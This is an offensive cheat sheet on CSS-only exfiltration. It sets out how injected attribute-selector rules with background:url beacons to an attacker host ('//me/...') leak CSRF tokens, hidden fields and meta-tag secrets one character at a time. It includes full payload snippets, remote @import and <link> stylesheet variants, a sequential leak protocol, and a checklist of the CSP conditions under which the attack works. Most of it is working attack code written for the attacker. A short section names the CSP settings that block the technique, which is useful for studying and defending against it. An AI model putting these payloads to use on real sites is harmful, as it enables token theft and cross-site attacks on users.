# CSS-only exfiltration — no JS needed

When CSP blocks all script but allows `<style>` or `style` attrs —
CSS selectors alone can leak attribute values one char at a time.
The classic blind-exfil technique for CSRF tokens, hidden fields,
and meta-tag secrets.

---

## 1. The mechanism — attribute-selector + background URL

```css
input[name=csrf][value^=a]{background:url(//me/a)}
input[name=csrf][value^=b]{background:url(//me/b)}
input[name=csrf][value^=c]{background:url(//me/c)}
```

The selector `[value^=a]` matches when the attr STARTS with `a` —
the matching rule's `background:url(...)` fires a request — the
URL your listener sees names the first char.

Full-alphabet coverage:

```css
input[name=csrf][value^=a]{background:url(//me/first/a)}
input[name=csrf][value^=b]{background:url(//me/first/b)}
...36 lines for a-z0-9...
input[name=csrf][value$=a]{background:url(//me/last/a)}
input[name=csrf][value$=b]{background:url(//me/last/b)}
...36 for $=...
```

`value^=` for the first char, `value$=` for the last — then
`[value*=XY]` substring pairs for the middle chars (harder —
quadratic combos).

---

## 2. The injection-point requirements

```html
<!-- needs: a <style> block you control OR a style attr -->
<style>
  input[value^=a]{background:url(//me/a)}
  ...
</style>

<!-- or via a style-attr on a wrapper: -->
<div style="background:url(//me/a)">   -- no selector — self only
```

The `<style>`-block version is the real one — the selector applies
page-wide. The style-attr version only styles that element — can't
leak other elements' attrs.

---

## 3. The `<link>`/import variant — remote CSS

```html
<link rel=stylesheet href="//me/evil.css">
<style>@import url(//me/evil.css);</style>
```

If `style-src` allows your host — pull the whole ruleset remotely.
The css file on your server:

```css
input[name=csrf][value^=a]{background:url(//me/first/a)}
input[name=csrf][value^=b]{background:url(//me/first/b)}
input[name=csrf][value^=c]{background:url(//me/first/c)}
input[name=csrf][value^=d]{background:url(//me/first/d)}
input[name=csrf][value^=e]{background:url(//me/first/e)}
input[name=csrf][value^=f]{background:url(//me/first/f)}
...a-z0-9-_{36+ lines}...
```

---

## 4. The sequential-leak protocol — char-by-char

```text
round 1: [value^=X] rules → learn char 1
round 2: [value^=Xc] rules → X + char 2 (X = known prefix)
...
```

Needs N requests × 36 selectors each — the token leaks char-by-char.
For a 20-char token: ~720 selectors total. Practical for CSRF
tokens, slow for long secrets.

```css
/* after learning prefix "aB3": */
input[name=csrf][value^=aB3a]{background:url(//me/r2/a)}
input[name=csrf][value^=aB3b]{background:url(//me/r2/b)}
...
```

The round-trip — your listener tells you char n; you inject the
next selector-set with the known prefix. Needs multiple injections
or a css file you can UPDATE between rounds.

---

## 5. The dynamic-CSS trick — updating the stylesheet mid-leak

Your listener knows char 1 → serves a NEW css probing char 2 —
but the browser only loads it once per page. Solutions:

```text
- the bot re-renders the page per round (bot revisits)
- use @import chains that block until your server responds
- a service-worker-driven approach (rare)
- the classic: many @imports where each is a different prefix —
  the server delays each until the prior match resolves... complex
```

The practical version: the bot visits the page ONCE — leak only
what a single-shot css can carry. The `[value*=XY]` substring
pairs can probe ALL 2-char windows in one shot (~1300 rules for
a-z0-9 pairs) — a fat css but one-shot.

---

## 6. The `style`-attr variant — self-element only

```html
<div style="background:url(//me/x)" data-x="SECRET">
   -- the style applies to THIS element — you can't select on it
   -- use: an injected <style> elsewhere, or
   -- a data-attr the page reads... no — style-attr leaks nothing
```

style-attr injection alone can't leak OTHER elements — it only
styles itself. Exfil needs the selector engine → needs a `<style>`
block or `<link>`.

---

## 7. The scroll/animation tricks — non-selector leaks

```css
/* scroll-to-text — a marker that becomes visible: */
.x{animation:x 1s}@keyframes x{from{transform:translateY(0)}to{transform:translateY(100px)}}
   -- animation as a beacon — a matched rule animates → the
      scroll position changes → detectable via scroll-events
      (needs JS to observe — CSS-only leaks are URL-based only)
```

The CSS-only exfil is fundamentally the URL-beacon — no way to
signal "matched" without a fetch.

---

## 8. The gates — what kills CSS-exfil

```text
CSP style-src 'self'           → <style> and <link> both blocked
CSP img-src 'self'              → background:url(//me/) blocked
no <style>/style-injection point → can't inject the css at all
the secret isn't in a [attr]    → attribute-selector has no target
   — meta csrf-token IS in an attr — works
   — cookie value — NOT an attr — dead
   — DOM text — NOT an attr — dead (unless a css :has() trick)
```

`:has()` and `:not()` advanced selectors can sometimes select on
non-attr properties — modern CSS is more powerful than attr-only.

---

## 9. The check-list

```text
1. can you inject <style> or a full-stylesheet <link>?
2. is the secret in an HTML attribute? (name/value/content/id)
3. is img-src open to your host (the beacon)?
4. is style-src open to your css?
```

All four → CSS-exfil is viable; any NO → pivot to JS or accept
no-exfil.
